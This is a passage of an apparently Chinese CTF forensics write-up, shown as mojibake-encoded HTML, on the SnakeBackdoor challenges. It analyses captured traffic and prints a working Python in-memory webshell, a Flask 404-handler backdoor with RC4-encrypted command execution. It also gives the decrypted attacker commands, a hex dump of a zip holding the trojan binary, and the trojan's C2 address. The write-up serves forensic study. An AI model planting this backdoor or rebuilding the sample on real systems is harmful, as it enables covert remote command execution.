jKXwOpODKO8R8YHnQM+rLk6EOabCdGK57iRzMcT3wc436kVmHXDcI0ZsYGY5aIC5DbdWjUt2ZuU0LmuLwzCTS99zhOoO8DKNqbK4bINLyAI2X928xib+hmIOqp3oSgC2PdFc8yqthN9S55omtex2xkEe8CY48C6z4JtqVtqhPQWQ8kte6xlepiVYCqIbE2Vg4fN//L/ff/u//9p4Lz7uq46yWenkJ/x90j/5mEIors5McSuFi9dygyyR5wJfuqGhOfsVVwJe'</span>        decoder = PayloadDecoder()    layers, content = decoder.process_payload(encoded_payload)        <span class="hljs-built_in">print</span>(layers)    <span class="hljs-built_in">print</span>(content.decode(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'replace'</span>))â€‹<span class="hljs-keyword">if</span> __name__ == <span class="hljs-string">'__main__'</span>:    execute()
</code></pre>
<p>è·‘å‡ºæ¥æºä»£ç </p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/01279623dae14bf29167e4f3e5768698~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=LkCtv27tZSa280zIyEhfA9LiJvo%3D" alt="" loading="lazy"/></p>
<p>å¯ä»¥çœ‹åˆ°å¤åŸå‡ºæ¥çš„æºä»£ç RC4çš„å¯†é’¥æ˜¯v1p3r_5tr1k3_k3yï¼Œæ‰€ä»¥flag{v1p3r_5tr1k3_k3y}</p>
<h2 data-id="heading-4">4.SnakeBackdoor-4</h2>
<pre><code class="hljs">æ”»å‡»è€…ä¸Šä¼ äº†ä¸€ä¸ªäºŒè¿›åˆ¶åé—¨ï¼Œè¯·å†™å‡ºæœ¨é©¬è¿›ç¨‹æ‰§è¡Œçš„æœ¬ä½“æ–‡ä»¶çš„åç§°ï¼Œç»“æœæäº¤å½¢å¼ï¼šflag{xxxxx}ï¼Œä»…å†™æ–‡ä»¶åä¸åŠ è·¯å¾„
</code></pre>
<p>æˆ‘ä»¬æ¥åˆ†æä¸Šä¸€é¢˜æˆ‘ä»¬å¾—åˆ°çš„shellä»£ç </p>
<pre><code class="hljs language-python" lang="python"><span class="hljs-keyword">global</span> exc_classglobal codeimport os,binasciiexc_class, code = app._get_exc_class_and_code(<span class="hljs-number">404</span>)RC4_SECRET = <span class="hljs-string">b'v1p3r_5tr1k3_k3y'</span><span class="hljs-keyword">def</span> <span class="hljs-title function_">rc4_crypt</span>(<span class="hljs-params">data: <span class="hljs-built_in">bytes</span>, key: <span class="hljs-built_in">bytes</span></span>) -&gt; <span class="hljs-built_in">bytes</span>:        S = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))        j = <span class="hljs-number">0</span>        <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):                j = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span>                S[i], S[j] = S[j], S[i]        i = j = <span class="hljs-number">0</span>        res = <span class="hljs-built_in">bytearray</span>()        <span class="hljs-keyword">for</span> char <span class="hljs-keyword">in</span> data:                i = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>                j = (j + S[i]) % <span class="hljs-number">256</span>                S[i], S[j] = S[j], S[i]                res.append(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])        <span class="hljs-keyword">return</span> <span class="hljs-built_in">bytes</span>(res)<span class="hljs-keyword">def</span> <span class="hljs-title function_">backdoor_handler</span>():        <span class="hljs-keyword">if</span> request.headers.get(<span class="hljs-string">'X-Token-Auth'</span>) != <span class="hljs-string">'3011aa21232beb7504432bfa90d32779'</span>:                <span class="hljs-keyword">return</span> <span class="hljs-string">"Error"</span>        enc_hex_cmd = request.form.get(<span class="hljs-string">'data'</span>)        <span class="hljs-keyword">if</span> <span class="hljs-keyword">not</span> enc_hex_cmd:                <span class="hljs-keyword">return</span> <span class="hljs-string">""</span>        <span class="hljs-keyword">try</span>:                enc_cmd = binascii.unhexlify(enc_hex_cmd)                cmd = rc4_crypt(enc_cmd, RC4_SECRET).decode(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'ignore'</span>)                output_bytes = <span class="hljs-built_in">getattr</span>(os, <span class="hljs-string">'popen'</span>)(cmd).read().encode(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'ignore'</span>)                enc_output = rc4_crypt(output_bytes, RC4_SECRET)                <span class="hljs-keyword">return</span> binascii.hexlify(enc_output).decode()        <span class="hljs-keyword">except</span>:                <span class="hljs-keyword">return</span> <span class="hljs-string">"Error"</span>app.error_handler_spec[<span class="hljs-literal">None</span>][code][exc_class]=<span class="hljs-keyword">lambda</span> error: backdoor_handler()
</code></pre>
<p>è¿™æ®µä»£ç æ˜¯ä¸€ä¸ªå…¸å‹çš„<strong>Python å†…å­˜é©¬</strong>ï¼Œå®ƒè¢«æŒ‚è½½åœ¨ Flask ç­‰æ¡†æ¶çš„ 404 é”™è¯¯å¤„ç†å¥æŸ„ä¸Š</p>
<p>è¦æ‰¾åˆ°æ”»å‡»è€…ä¸Šä¼ çš„<strong>äºŒè¿›åˆ¶åé—¨æ–‡ä»¶å</strong>ï¼Œä»æµé‡åˆ†æå…¥æ‰‹ï¼Œåˆ©ç”¨è¿™æ®µä»£ç æä¾›çš„åŠ å¯†é€»è¾‘è¿›è¡Œè§£å¯†</p>
<p>HTTP è¯·æ±‚å¤´ä¸­åŒ…å« X-Token-Auth: 3011aa21232beb7504432bfa90d32779ï¼Œæ”»å‡»å‘½ä»¤é€šè¿‡ POST å‚æ•° data ä¼ é€’ï¼Œæ•°æ®æ ¼å¼ä¸ºåå…­è¿›åˆ¶å­—ç¬¦ä¸²</p>
<p>é‡‡ç”¨äº† <strong>RC4</strong> ç®—æ³•ï¼Œå…³é”®å¯†é’¥ï¼šv1p3r_5tr1k3_k3yï¼Œè§£å¯†åçš„å‘½ä»¤é€šè¿‡ os.popen(cmd) æ‰§è¡Œï¼Œç»“æœå†æ¬¡ RC4 åŠ å¯†å¹¶ä»¥ Hex å½¢å¼è¿”å›</p>
<p>é‚£æˆ‘ä»¬å¯ä»¥åœ¨ Wireshark æˆ–æµé‡åˆ†æå·¥å…·ä¸­ï¼Œç­›é€‰å‡ºç¬¦åˆä»¥ä¸‹ç‰¹å¾çš„æµé‡ï¼š</p>
<pre><code class="hljs language-sql" lang="sql">http <span class="hljs-keyword">contains</span> "X-Token-Auth"
</code></pre>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/edf21eb5cd09472282c1bb20254ce94d~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=qS6LOitWpe7war0O1lcLmzRB0Kg%3D" alt="" loading="lazy"/></p>
<p>æ‰¾åˆ°é‚£äº› POST è¯·æ±‚ï¼Œå¤åˆ¶ data å‚æ•°åé¢çš„åå…­è¿›åˆ¶å­—ç¬¦ä¸²ï¼Œå¸¦å…¥åˆ°ä»¥ä¸‹è„šæœ¬ä¸€ä¸ªä¸ªå»è¯•</p>
<pre><code class="hljs language-less" lang="less"><span class="hljs-selector-tag">import</span> <span class="hljs-selector-tag">binasciidef</span> <span class="hljs-selector-tag">rc4_crypt</span>(<span class="hljs-attribute">data</span>: bytes, <span class="hljs-attribute">key</span>: bytes) <span class="hljs-selector-tag">-</span>&gt; <span class="hljs-selector-tag">bytes</span>:    <span class="hljs-selector-tag">S</span> = <span class="hljs-selector-tag">list</span>(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))    <span class="hljs-selector-tag">j</span> = <span class="hljs-number">0</span>    <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">i</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">range</span>(<span class="hljs-number">256</span>):        <span class="hljs-selector-tag">j</span> = (j + S[i] + key[i % <span class="hljs-built_in">len</span>(key)]) % <span class="hljs-number">256</span>        <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[i]</span>, <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[j]</span> = <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[j]</span>, <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[i]</span>    <span class="hljs-selector-tag">i</span> = <span class="hljs-selector-tag">j</span> = <span class="hljs-number">0</span>    <span class="hljs-selector-tag">res</span> = <span class="hljs-selector-tag">bytearray</span>()    <span class="hljs-selector-tag">for</span> <span class="hljs-selector-tag">char</span> <span class="hljs-selector-tag">in</span> <span class="hljs-selector-tag">data</span>:        <span class="hljs-selector-tag">i</span> = (i + <span class="hljs-number">1</span>) % <span class="hljs-number">256</span>        <span class="hljs-selector-tag">j</span> = (j + S[i]) % <span class="hljs-number">256</span>        <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[i]</span>, <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[j]</span> = <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[j]</span>, <span class="hljs-selector-tag">S</span><span class="hljs-selector-attr">[i]</span>        <span class="hljs-selector-tag">res</span><span class="hljs-selector-class">.append</span>(char ^ S[(S[i] + S[j]) % <span class="hljs-number">256</span>])    <span class="hljs-selector-tag">return</span> <span class="hljs-selector-tag">bytes</span>(res)<span class="hljs-selector-tag">SECRET</span> = <span class="hljs-selector-tag">b</span>'<span class="hljs-selector-tag">v1p3r_5tr1k3_k3y</span>'#  <span class="hljs-selector-tag">data</span> å­—ç¬¦ä¸²å¡«åœ¨è¿™é‡Œ<span class="hljs-selector-tag">enc_hex_cmd</span> = "è¿™é‡Œå¡«æµé‡åŒ…é‡Œçš„<span class="hljs-selector-tag">hex</span>å­—ç¬¦ä¸²" <span class="hljs-selector-tag">enc_cmd</span> = <span class="hljs-selector-tag">binascii</span><span class="hljs-selector-class">.unhexlify</span>(enc_hex_cmd)<span class="hljs-selector-tag">cmd</span> = <span class="hljs-selector-tag">rc4_crypt</span>(enc_cmd, SECRET)<span class="hljs-selector-class">.decode</span>(<span class="hljs-string">'utf-8'</span>, errors=<span class="hljs-string">'ignore'</span>)<span class="hljs-selector-tag">print</span>(f<span class="hljs-string">"Decrypted Command: {cmd}"</span>)
</code></pre>
<p>è§£å¯† 1814 æµçš„ Dataï¼š</p>
<ul>
<li>
<p><strong>Payload</strong>: bab6694ba3c9...</p>
</li>
<li>
<p><strong>è§£å¯†ç»“æœ</strong>: unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip</p>
</li>
<li>
<p><strong>æ€§è´¨åˆ¤å®š</strong>ï¼šè¿™æ˜¯ä¸€ä¸ª<strong>ç³»ç»Ÿå‘½ä»¤</strong>ï¼Œè°ƒç”¨ç³»ç»Ÿè‡ªå¸¦çš„ unzip å·¥å…·ï¼Œå®ƒæ˜¯åœ¨<strong>å‡†å¤‡ç¯å¢ƒ</strong>ï¼Œä¸æ˜¯åœ¨è¿è¡Œæœ¨é©¬æœ¬ä½“</p>
</li>
</ul>
<p>è§£å¯† 1817 æµçš„ Dataï¼š</p>
<ul>
<li>
<p><strong>Payload</strong>: a2ae330da7846599188b26257a88f10b50790cb47e6a97177e1053c351</p>
</li>
<li>
<p><strong>è§£å¯†ç»“æœ</strong>: mv /tmp/shell /tmp/python3.13</p>
</li>
<li>
<p><strong>æ€§è´¨åˆ¤å®š</strong>ï¼š</p>
<ul>
<li>
<p>è¿™é‡Œå‡ºç°äº†ä¸€ä¸ª<strong>ç»å¯¹è·¯å¾„</strong> /tmp/python3.13</p>
</li>
<li>
<p>å®ƒä¸æ˜¯ç³»ç»Ÿè‡ªå¸¦å‘½ä»¤ï¼ŒLinux å¹¶æ²¡æœ‰ python3.13 è¿™ä¸ªåŸç”Ÿæ ‡å‡†è·¯å¾„ï¼Œä¸”ç³»ç»Ÿæœ¬èº«è¿è¡Œçš„æ˜¯ 3.12</p>
</li>
<li>
<p><strong>å®šæ€§</strong>ï¼šè¿™è¡Œå‘½ä»¤çš„ä½œç”¨æ˜¯<strong>å¯åŠ¨ä¸€ä¸ªç‰¹å®šçš„äºŒè¿›åˆ¶æ–‡ä»¶å¹¶è®©å®ƒæŒç»­é©»ç•™</strong>ï¼Œè¿™å®Œå…¨ç¬¦åˆæ‰§è¡Œæœ¨é©¬æœ¬ä½“çš„è¡Œä¸ºå®šä¹‰</p>
</li>
</ul>
</li>
</ul>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/b84ae436d7b24aa0b8939067e0662c53~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=OCrBg6lk1lfaOjKj5YWlgATarb8%3D" alt="" loading="lazy"/></p>
<p>flag{python3.13}</p>
<h2 data-id="heading-5">5.SnakeBackdoor-5</h2>
<pre><code class="hljs language-css" lang="css">è¯·æå–é©»ç•™çš„æœ¨é©¬æœ¬ä½“æ–‡ä»¶ï¼Œé€šè¿‡é€†å‘åˆ†ææ‰¾å‡ºæœ¨é©¬æ ·æœ¬é€šä¿¡ä½¿ç”¨çš„åŠ å¯†å¯†é’¥ï¼ˆhexï¼Œå°å†™å­—æ¯ï¼‰ï¼Œç»“æœæäº¤å½¢å¼ï¼šflag{<span class="hljs-selector-attr">[0-9a-f]</span>+}
</code></pre>
<p>æ ¹æ®ä¸Šé¢˜ï¼Œ1813æµæ˜¯åœ¨è§£å‹ï¼Œæ‰€ä»¥å¯ä»¥æå–æµé‡åŒ…ä¸­ä¼ è¾“çš„123.zipï¼Œæ‰€ä»¥å¾€å‰ç¿»ï¼Œç¿»åˆ°1807æµ</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/d564f243b4ec4240a37ea6934bb26706~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=39YAECafRA%2B67J7gbuM3wdsbpUY%3D" alt="" loading="lazy"/></p>
<p>PKå¼€å¤´å°±æ˜¯æœ‰.zipå‹ç¼©åŒ…äº†ï¼Œæ˜¾ç¤ºé€‰æ‹©ä¸ºåŸå§‹æ•°æ®</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/40a3741306b84f99826e22a3cb1852aa~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=Um3rqYUYi6mREa%2Br%2F1Jk%2Bt6n36Y%3D" alt="" loading="lazy"/></p>
<p>å°†504bå¼€å¤´é‚£äº›ä¸œè¥¿éƒ½å¤åˆ¶ä¸‹æ¥ä¿å­˜åˆ°.txtæ–‡ä»¶å†…ï¼Œé€šè¿‡ä»¥ä¸‹è„šæœ¬è¿›è¡Œä¸€ä¸ªæå–</p>
<pre><code class="hljs language-dart" lang="dart"><span class="hljs-keyword">import</span> binascii#é‚£æ®µé•¿åå…­è¿›åˆ¶å­—ç¬¦ä¸²hex_data = <span class="hljs-string">"504b03041400090008002431955be01c1a3483100000f838000005001c007368656c6c555409000354d547695ad5476975780b000104000000000400000000b513d2ddc97797c8b164bf85a8cfb6162732440e1431884df99aae322636568e2824d8eadc31815e8d6b5dda1fc3d6ee45e91146de5248d321d8b87c65e27269dddb8aa41496c9acfec533833226e162c40d9404b301751a6cca6a52adea3f175b4b0f2c11989600b9fc2c8a007e393962dc264416f07e3232ca03fd484421c638aa6079b54493a1c10e86de01a10ab08fbf7bbb2b5232b139dbec9e22312e3ecd22f5f1e6eed431dad7a8ec8e5938dedca24c38f4d2df50d34a88c5d6e51f156612f990f0a30c8aac7e91e6ab68ec994d332fd9392f47b3d513d684a913dfb2be73216fe3a1314cb4cfb6746bd1061198731e792596c74dc7c81caa67e136aa9838e6d8def8a79329971d934425be0202850e19571f340229e64d186e570fdb6da66531d7e9adb508a8f28442c42a711bb950c9952aa3b4c20ba46bb7bbfe024268e068c9a93ce45c6764b8d879ea1460271c73b29ea5dc8b79251ff941302e2f6060c851074e631cd489d1978c83cc85d01c4111d78cc99985f6231c406694d33d94759667346d566d97f5e31c6f6694e017927bbacd853ca588276a105eab80e9eb7b039c4cfb7c1a023cb9686cd4a28d977bb09e14dc5a53cf3c0247abbf8a120050ea28b2a25779a997e5b738c4fe6f6b39d7d3a7b926be1c727f43971c7116b9fb7dbbfa2770b7aa250cf5c7764c1756ad7bfbe3fc838ad20c6dc7aa9ad7a60cc4c5c988fcb1ad7b2d93719855c155908db4f19e5725c1f7052ae9e226e46e716501b49599648a8492eb1e7f8e340ea7c0127affc890c359284a61a7ad7159f591afdae771c6ee6d82b4a1c3c8bdcb6fd42649ba37a41e3f20c8d7f70c1166161884a5e74cf5b4991992310fcadd61c599884b8d982809bc6bb776236c10642f9fa0b513b731431c269853bebbd9920468397c3f0d7587f05500550bf7096e054b3e541006d22620d73d0fc018eb760042878362eb1fd7090157a6713774fa5fdf5b5e6cc11cf945427121029e9ba66f7b1f3e93832d1434687c720f6ab52d1f979d590eaf6ade5ee8685259afc823ca12a6382bd3bd46e674f9914cf1a4e4c4ee3d6699fbdb28934aa1de1a33d5a9a9c65d74314d8e9c667f01e881b58757897486b66ee3ccbb114bf61a652115660b3b65f08da901554c63e9fdceca137b1c3161c2a27bec3b3d3ced97630c980611f8ea13611a3a8520e6b9dc430ca91f60aa65ac52355fbff0ccbbef479e60f3d217be6ca580b4f9fa315b681467cb1dc3348a23889685e0274fd5f16cc153d0dfe862fa54feea077eaf8a10a0d13aa54dbfde88d689bfae3f716d303f14d08139fe3d6528e2aad3fa28f3d4ce91b54e3589bfe4f73c73e7ec963fb4265104e5393fa1ad407bc4aea65c75dd83787e2b782ad0587032730a860d15054ce554645ce2e8fda849adc619b2c09242f420befebf279bb3c1e8716e431cf2b89caa849e76c3cddf20944c43731aee2ae257292704589ee9d93654b72d4ee4daf95f0c58ac33cf2d7d5a9123f6cdab29475465c6c4643adc7eb9301f3f30048463a2c11f7c7efd30eac836ec8a62690f24d010af11974f58b66467cc7f3294ceccb0496b381ed3774dac4642b6ecd3b05214cfd67756c8f90c5380f61fba3a0be60c723e0b9a8a1ab291f214b06410dd834f0326d2961cdf1a8906807d8e82492ad63151f2a18dd5d527b151b5e7219d824c8c7b18de38d0ca7117a321f689ed9cf00b90f37cf42fcc34327fd6763b95a33cfcdd941cfe3fd5fd1a7b6a164135ba5b9e015902315c93d73ade804c42a6b3c7f1f6d76141397f6867167edca1d2ae3de618647d7e283554df51accd77418644087f8a0d1d6bd37e30f9c387e5c86c747e483b1bac9bdfeef360c59ba2cc8c31b5e58b30e004ebddd26ade10fbc0c27c1e8b883c72a92a7645a2910a79f665f4b106e9188a14436c567f51ea48f94ff2283f9cc1f13aeb55e25e6c517bf41073f3cf610c2119f065eb0d29982b3d81b5af4dc84a11d17c7b328ad83253c3d4d099674bc5632b8e4d79188268e420171b51b789491c82d4fb543bee92182a0287a61797d99e034bcb8ce72942884fef00fed929747e526d463e66961e48e9ea66048d8b42f7bedd5fc9c80c7fbe09c1a1c0d84111d71f34bef352287345bad7e417c8a3c43b8582f6410fe2091feb73548ee05a9eebde8b310817cdeade38a5736161bfc8f9453f7cc80a2f2dbf5ac2c83f489424719276bcd7b238249157cb40d2715dc46b3f7acc1520148ee03430c2a7da27e3d4d204178cb4ba2d378e2fe8aaea895251de970cda7dfa00aaef5eaa2f2673663d880983d9fa6cdf6aeeeba99bb1b2bf774a9685b13b8aec015e1782e31c5582125445c1f3b314912e93c6677be910ae19b3c4237c417beafb7acd13c85fde3f2d517c00e302f7bfc60bb967b4f4e00e6f53ca2a3125b7b260e5cb311f41449ce394a7c164830836b516d246c1afaf7c0c39c082e7a8d2ee66374b7d8c37db77f634c22025fad64a6df59d41ce4c5191517b821c5e7e2238e92948f10f17088935d976e2ed1986eef61bc0c481c5f4dfc4e809dd642712290ae75e80454e132e1051e4fe1554ef49ec33afbfc978e3c72b7b1f7c494bec23d342a8821f1eb5d9749d82d37d8de9bd33bdc81fdcee09bd532b0a131711126c47e90e32ea3cbdfe594717e05983b50df59150d7e5a15cd618a9866ec18aee3262f3b5bebd30b459c004d30bfcb0f360b7d352169e647a7c287db39b79fc4ceae70b2cf8c7658868a2c62aecd65e525b4e0dc3de33940691361bbb905d0eddd67f40f09170c314206b5c6504edbaaa92bb41495d8422b546de33415234f282a60121ff6621a3574e693c7525893bc55f2017c117ae699b315e98f48729229b55ee72d7ef1e3e81a82369796e95aa2a6bd1c04dd69ec76748564859f3226d8291782d7f39120da7cd4f84c75db5530bb4ff9ec55404d68061ede3bc81409f56f1306b9aa5da184ec4c1d88d89663a4777a359a4dcec516243950cefb912563a81b916f719c4b70b3ae5147fbaf0abb87b799f17fca39564b12f9ec1e14c7f1a24e0893fcbeb864bef56f72b9801867ac327d4e9df67e044a60c0c44eac4db6589e1937762925328debd3ee0033a7e7e28e82248b07f263a1a8fdce1c72ecff1b814977edc5ca76bffb7fc22207c856a018891127ad857548e25398cfa997ff603eb5ae6be0edc690614cf183d6a19310bfc9de10f3b2ec0aba9448127360baf508d8fe1a661e819ad96028bdd1fd88350571fb522993c23aa6af907ab063cc27b3e9ce1edc9d8126bebf17182ec066d65e0801f026485100c66b14b26876570d1ef4b61bb3d2c0bd137d6744e092ede9bfd2f532993cdd8bdadeb4a237cbaae27f57d10e81ef26dfe81a8df41c5f5e5e6170a1212dcd4bf162dbf51e0d89b5929a7a852f762407591bca0ffde5aaa876ec030686080581a88813430800e0b35cf8583c0587184a81eadac8ba97fc3690718667154eeb64faf290a4b302bd782acd35e86675ea0560f42980596bd4357592b4c8328c08fe06a07ffe40d823ca76de71c667e1f687985bfe1a8516a634f3a2329e2037dd74a6044e0fc4a35f29e50b0fd9910fa26a2aa6608166b4e105587fb1ec7152f4e31dae57392978512d263c6ab623df7258df18e5b961f0637d5f1cccad010595c7e9d26c0f46f5ab7565c207dcfd89eecacad59f819fa93a4ed7025b035c2c3c42116c455615612bbc05c29540ffeae786afad4417948fffa8723489716aaf2f133c3b34de35e82901e9748046c9367f8ec30153982981a8e0e3ac1e6774dcd7c93219216bcad1a367452bdd5e672df506b185a3181c51cab3d2e6066f68fbea7e7f8a9cf4b9fae41bb0331fc06a1311f02feda19fe6e2b06bc22f700da588677f6d2c4b8e82502198e5113a6c7ed984b82a97e5639e2e2ef3aaf24ba348f33ada85f25ef7523a45918150589fc61b93183f18c99656711a2c75baaa0b9eaceb21b576a1276d3a4f807dabbf51d25d464f6228e93dc1b96a10bf3342ef268b85fbfd816aa9c61180ed7ef55b2d0738a4ddaf76b02b381e8f339030d53d64344772c56a251331eefeee7edd4bb28ad7e6687f724354c45b7266072c2e3da8939bf34fbebfd0de204033088205c4c671584a9979ab628fd2dc4d7ab8d57a25bd9b064018f000fd21b4023ac94736bef5701505e2ea75e0670931a325b296f3447787268ce000a45c43fa79b873828d5c0cfbf8403f0e3ae320d025552f090d6e4460930c35726f97a7d8505ef88dbf3248f3944b9e00e60d77b7537555221a7d8b9f20ceafe369ac7519cdc8fcaad00d63ffd58e624cb1e3a2fde7870faf58e4c25ac3fa548b742749389f3417df80abdd2dd66bebe976f03e3e1cd08a19e2cdd86e3d4bd7230b208ea7b482b226c9f47011cff59a765ab7a1c52b7e62f4b88b080ce688714ea00bcd4c5e603c7a2e73eed1795d8958bc16e9457020585d46c2c210d407caca8925746ba8a9dc67903a86c5e883ecf0a4103b5f742bb7275e60a1ae326349f73c9754fe78e1fa2012c9ffd04a6b6a2019e6aff4e1195441630f1d7b919922ed16fc7a06dd08c7df59c9729af49fd5f325af9712a982c5b2d499e3efd1fdb37d2df4977a0786debc7dee8082406ea3474b840742f53b51ef2c8197a4033ae04f5ee3652e6eeb1c33943e3748f16b12bf20de2c983fb7bee1ad6801e867f3da272364b21653b460effcb781b34119903895b3daf8e0783b9bd27d73d56a2294f428fb532d2330738c2f59948ed049312f238f99a9daf3d38db6afe1b406f608399cd837875828dd8aa44070efcd131f5f976d224e7e7022bdf17e1bebd05e9d98637e27c732dd6a4660cf59b7a9e32aa8e33837919f86b9f60bcb53926c40b7e3134cf95673e7e579ed81991a64d3a2bc9677daf2e7acaa33a50aa4249932545ae4195d8a13683f3460bbc3bbeded28c58d50ce63bdddda4a5d0d894a5c704443c013e53393d887f8407e0332ce41e462d41d7f81ff0fe095f0feb0cb789f40a033356bbb63bd4519cbfd772d85ecb244b6740ef554377d57b9c9f0fdb9ed11e5d72e7e28d66fd34130b70fee6cbd0469cd9927eefb844b2286a45b6023a682621d3672619e57bcce26c0dc39117ac8d04c3b3ec7f639d9379ec5cc0b313ab62bbfe8198b60573fe96c4f4b13196462c39d3bd79b5a152211eca5fce5bc02d15b4d385e5de668c927dd4d0f7c6f0bd9898b9a110571f1d3c98796b9534f0c40327dfc5bb70e0aff89845a12038e31cc63107885582818abf94ec6a9b36655f8e1541e06dccb929b1fc28f2825a13bc13e9ccee304394f3cdfa18179f5aed4059482c889609867fdf0babd73735e583eb4886bb9f4ef71ca57a51f7b70b0e9157ea2fda7dc990879d5ebd240a6c6d2ced45219a56c9ebe334a38d8ebb5ba8b3c46575ca42336153394328d6f454f10a146590422b94b64f291240be27e8d653ff92390dd71302af099e50e1c06b16ab12795d687d30effe49343f90604b7691580acb7e4564f58d31835ea7cf3a505f09fe3c2df6a6a5bc3d311a8bf3f26fe8572828837d821b38cf4fd6f2421a4e496fae5fcb04b9f1ae53991838327822e5ca84976cb70c8ae1da7c2b6ccd65659bda0bda09615e54e952ed46ad9363cbb455db1cd00263f047455c2143517bf48b64b39e279ba576730a2aa84f3f9bced6fc04836500c85b61e8d6e946c3e0fb21299157e26d619e8d623af1597f9d02932ef664a1125800247eb55c820e9f9123f9176bbc66bc23ee91b452621d1e33d43f0cdf20d6e4f1f1f2ae3de204a5284453ac8e383824be409f9f3b0ef7c7ce10e577c360dad017efe5e6e755bb3b1f7a497d3be835a13251942cf828fcb8cb5cb18d19c219a67d16ed6030161c6e1ac828bab5d1599fe9917d69f530ce504b0708e01c1a3483100000f8380000504b01021e031400090008002431955be01c1a3483100000f8380000050018000000000000000000ed81000000007368656c6c555405000354d5476975780b000104000000000400000000504b050600000000010001004b000000d21000000000"</span># è½¬æ¢å¹¶å†™å…¥æ–‡ä»¶<span class="hljs-keyword">with</span> open(<span class="hljs-string">"shell.zip"</span>, <span class="hljs-string">"wb"</span>) <span class="hljs-keyword">as</span> f:    f.write(binascii.unhexlify(hex_data))<span class="hljs-built_in">print</span>(<span class="hljs-string">"æå–æˆåŠŸï¼šå·²ä¿å­˜ä¸º shell.zip"</span>)
</code></pre>
<p>å‘ç°è§£å‹éœ€è¦å¯†ç ï¼Œè€Œæ ¹æ®1813æµè§£å‡ºæ¥çš„æŒ‡ä»¤</p>
<pre><code class="hljs language-bash" lang="bash">unzip -P nf2jd092jd01 -d /tmp /tmp/123.zip
</code></pre>
<p>å¯†ç å°±æ˜¯nf2jd092jd01ï¼Œè§£å‹ç¼©å‡ºä¸œè¥¿æ¥ï¼Œç„¶åidaå¯åŠ¨ï¼Œè¿›å…¥åˆ°mainå‡½æ•°æ¥</p>
<p>é¦–å…ˆæ˜¯æœ¨é©¬å°è¯•è¿æ¥åˆ°æ§åˆ¶ç«¯ IP 192.168.1.201ï¼Œç«¯å£ 58782</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/a5056f0ff4ad460f907aab72d7f0fcd4~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=vjIdbEkfU9QcFYfF3D13y6oWWRU%3D" alt="" loading="lazy"/></p>
<p>è¿æ¥æˆåŠŸåï¼Œæœ¨é©¬é¦–å…ˆè°ƒç”¨ sub_18ED ä»æœåŠ¡å™¨æ¥æ”¶ <strong>4 ä¸ªå­—èŠ‚</strong>çš„æ•°æ®å­˜å…¥ v7</p>
<p>ä»£ç å¯¹ v7 è¿›è¡Œäº†å­—èŠ‚åºè½¬æ¢ï¼Œå¤§ç«¯è½¬å°ç«¯æˆ–åä¹‹ï¼Œå¹¶å°†å…¶ä½œä¸º seed</p>
<p><img src="https://p6-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/fc470df2664c443d89c4fb449e59f07a~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAg6JqB5pmv572R5a6J5a6e6aqM5a6k:q75.awebp?rk3s=f64ab15b&amp;x-expires=1768874375&amp;x-signature=EWcvxnVb8fMTAqlP1ALzD4uEXz0%3D" alt="" loading="lazy"/></p>
